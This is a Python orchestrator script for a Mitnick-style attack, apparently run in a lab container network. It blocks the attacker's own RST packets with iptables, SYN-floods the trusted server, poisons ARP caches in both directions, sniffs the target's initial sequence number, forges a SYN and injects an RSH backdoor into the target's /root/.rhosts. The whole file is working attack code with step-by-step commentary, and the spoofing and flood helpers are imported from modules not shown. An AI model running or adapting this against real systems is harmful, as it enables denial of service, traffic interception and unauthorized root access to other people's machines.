"""
main.py — Mitnick Attack Orchestrator

This script coordinates the full attack sequence:

  0. Block our kernel's automatic RST replies so the forged session stays alive.
  1. SYN-flood the trusted server to prevent it from sending RST to the target.
  2. Poison both ARP caches so the target's SYN/ACK flows through us (MITM).
  3. Start a sniffer waiting for that SYN/ACK (and its ISN).
  4. Send the forged SYN impersonating the trusted server.
  5. Capture the ISN, complete the handshake, inject the RSH backdoor.
  6. Clean up iptables rules and background processes on exit.

Network layout:
  Attacker (us):       10.0.2.10  — Kali container, privileged mode
  Target (victim):     10.0.2.20  — Ubuntu, runs RSH via xinetd
  Trusted server:      10.0.2.30  — Ubuntu, trusted by target's /root/.rhosts
"""

import threading
import sys
import time
import subprocess

from attack.dos       import start_dos_attack, stop_dos_attack
from attack.ip_spoofing import send_spoofed_syn, complete_handshake_and_inject
from attack.sniffer   import sniff_for_syn_ack
from attack.arp_spoof import start_bidirectional_arpspoof, stop_arpspoof

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
TRUSTED_SERVER_IP = "10.0.2.30"  # IP we impersonate; trusted by the target
TARGET_IP         = "10.0.2.20"  # Victim running the RSH service
RSH_PORT          = 514           # Standard RSH port (requires privileged source port)
CLIENT_PORT       = 1023          # Source port for the forged SYN; must be < 1024
INTERFACE         = "eth0"        # NIC inside the attacker container


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def run_command(command):
    """Run a shell command, raising on non-zero exit so callers can abort."""
    print(f"[+] Running: {' '.join(command)}")
    try:
        subprocess.run(command, check=True, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Error running command: {e}\nStderr: {e.stderr}")
        raise


def setup_rst_block():
    """
    Drop all outgoing RST packets from this machine.

    Why this is necessary:
    When the target sends its SYN/ACK back toward 10.0.2.30, the ARP-poisoned
    network delivers it to our NIC (10.0.2.10) instead. Our kernel sees an
    inbound TCP SYN/ACK for a connection it never opened, so it would normally
    auto-generate a RST to reject it. That RST would reach the target and destroy
    the forged session before we can complete the handshake.

    Dropping all outgoing RSTs prevents this kernel self-defense mechanism. The
    rule is removed in cleanup_rst_block() once the attack finishes.
    """
    print("\n[+] Blocking outgoing RST packets to prevent kernel interference.")
    run_command([
        "iptables", "-A", "OUTPUT",
        "-p", "tcp", "--tcp-flags", "RST", "RST",
        "-j", "DROP",
    ])


def cleanup_rst_block():
    """
    Remove the iptables RST-drop rule added by setup_rst_block().

    Uses -D (delete) with the exact same rule specification as -A (append) so
    only our rule is removed, leaving any pre-existing iptables config intact.
    Failure is non-fatal: the rule may already be gone if setup failed early.
    """
    print("\n[+] Cleaning up iptables rules...")
    try:
        run_command([
            "iptables", "-D", "OUTPUT",
            "-p", "tcp", "--tcp-flags", "RST", "RST",
            "-j", "DROP",
        ])
    except subprocess.CalledProcessError:
        print("[-] Warning: Failed to remove iptables rule. It might not have been set.")


# ---------------------------------------------------------------------------
# Thread entry points
# ---------------------------------------------------------------------------

def dos_thread_func(target_ip, target_port, stop_event):
    """
    Run the SYN flood in a daemon thread until stop_event is set.

    The thread blocks on stop_event.wait() after launching hping3, so it
    consumes essentially no CPU while the attack is in progress. When main()
    signals stop_event in the finally block, this thread wakes up and calls
    stop_dos_attack() to terminate hping3 cleanly.
    """
    process = start_dos_attack(target_ip, target_port)
    stop_event.wait()          # sleep until the main thread signals done
    stop_dos_attack(process)


def sniffer_thread_func(target_ip, server_ip, client_port, results_list):
    """
    Run the sniffer and store the captured ISN in a shared list.

    A list is used instead of a return value because threading.Thread does not
    propagate return values. Appending to a shared list is safe here because
    only this thread writes to it, and main() only reads it after join().
    """
    isn = sniff_for_syn_ack(target_ip, server_ip, client_port)
    if isn is not None:
        results_list.append(isn)


# ---------------------------------------------------------------------------
# Main orchestrator
# ---------------------------------------------------------------------------

def main():
    """Orchestrate the full Mitnick attack sequence."""
    print("--- Starting Mitnick Attack ---")

    stop_dos_event    = threading.Event()
    dos_thread        = None
    arpspoof_processes = None

    try:
        # Step 0: Block our own kernel's RST packets.
        # Must happen BEFORE the forged SYN, otherwise the very first SYN/ACK
        # we receive would trigger a RST from us.
        setup_rst_block()

        # Step 1: Start DoS in a background daemon thread.
        # daemon=True means Python won't wait for this thread when the main
        # thread exits — the finally block handles explicit cleanup instead.
        dos_thread = threading.Thread(
            target=dos_thread_func,
            args=(TRUSTED_SERVER_IP, RSH_PORT, stop_dos_event),
            daemon=True,
        )
        dos_thread.start()
        print("\n[Step 1] DoS attack running in the background.")

        # Give hping3 a moment to fill the server's backlog before we proceed.
        # If we send the forged SYN too soon, the server's queue might not be
        # saturated yet and it could send a RST to the target.
        time.sleep(1)

        # Step 2: Bidirectional ARP poisoning.
        # We poison both directions so that:
        #   - The target's SYN/ACK reaches us (we capture the ISN).
        #   - The server's own ARP traffic doesn't restore the target's cache.
        arpspoof_processes = start_bidirectional_arpspoof(TARGET_IP, TRUSTED_SERVER_IP, INTERFACE)
        print("\n[Step 2] Bidirectional ARP spoofing running in the background.")

        # Wait for the ARP entries to propagate. ARP caches on both hosts must
        # be overwritten before we send the forged SYN; otherwise the target's
        # SYN/ACK would bypass us and never be captured.
        time.sleep(2)

        # Step 3: Start the sniffer BEFORE sending the forged SYN.
        # There is a race condition if the sniffer starts after the SYN: the
        # target's SYN/ACK could arrive and be missed before tcpdump is ready.
        print("\n[Step 3] Starting network sniffer...")
        captured_isn_list = []
        sniffer_thread = threading.Thread(
            target=sniffer_thread_func,
            args=(TARGET_IP, TRUSTED_SERVER_IP, CLIENT_PORT, captured_isn_list),
        )
        sniffer_thread.start()

        # Brief pause to ensure tcpdump is fully initialised and the BPF filter
        # is attached to the interface before we trigger the SYN/ACK.
        time.sleep(1)

        # Step 4: Fire the forged SYN.
        # From the target's perspective, 10.0.2.30 (the trusted server) is
        # initiating an RSH connection. The target will respond with SYN/ACK,
        # which flows through us because of the ARP poisoning.
        print("\n[Step 4] Sending spoofed SYN packet...")
        my_isn = send_spoofed_syn(TARGET_IP, TRUSTED_SERVER_IP, CLIENT_PORT, RSH_PORT)

        # Block until the sniffer captures the SYN/ACK (or times out).
        sniffer_thread.join()

        if captured_isn_list:
            target_isn = captured_isn_list[0]
            print(f"\n[+] Success! Captured Target ISN: {target_isn}")

            # Step 5: Complete handshake + inject RSH payload.
            # With the ISN in hand we can calculate the exact ACK number the
            # target expects, making our forged ACK cryptographically valid from
            # the target's TCP state machine perspective.
            complete_handshake_and_inject(
                TARGET_IP, TRUSTED_SERVER_IP, CLIENT_PORT, RSH_PORT, my_isn, target_isn
            )
            print("\n[+] Attack payload injected. Check the target's /root/.rhosts file.")
        else:
            print("\n[-] Failed to capture ISN. Attack failed.")

        # Keep background processes alive so the operator can validate the result
        # before teardown (e.g., run `rsh 10.0.2.20 cat /root/.rhosts`).
        print('\nType "exit" to stop background processes and terminate.')
        for line in sys.stdin:
            if line.strip().lower() == "exit":
                break

    except KeyboardInterrupt:
        print("\nCtrl+C received, shutting down.")
    except Exception as e:
        print(f"\nAn error occurred: {e}")
    finally:
        # Teardown order matters:
        #   1. Stop ARP spoofing first so the network returns to normal routing.
        #   2. Remove the iptables rule so the kernel resumes normal RST behaviour.
        #   3. Stop the DoS last; the server can only recover once we stop flooding.
        if arpspoof_processes:
            stop_arpspoof(arpspoof_processes)

        cleanup_rst_block()

        if dos_thread and dos_thread.is_alive():
            print("Stopping DoS attack...")
            stop_dos_event.set()
            dos_thread.join()

        print("\n--- Attack Finished ---")


if __name__ == "__main__":
    main()
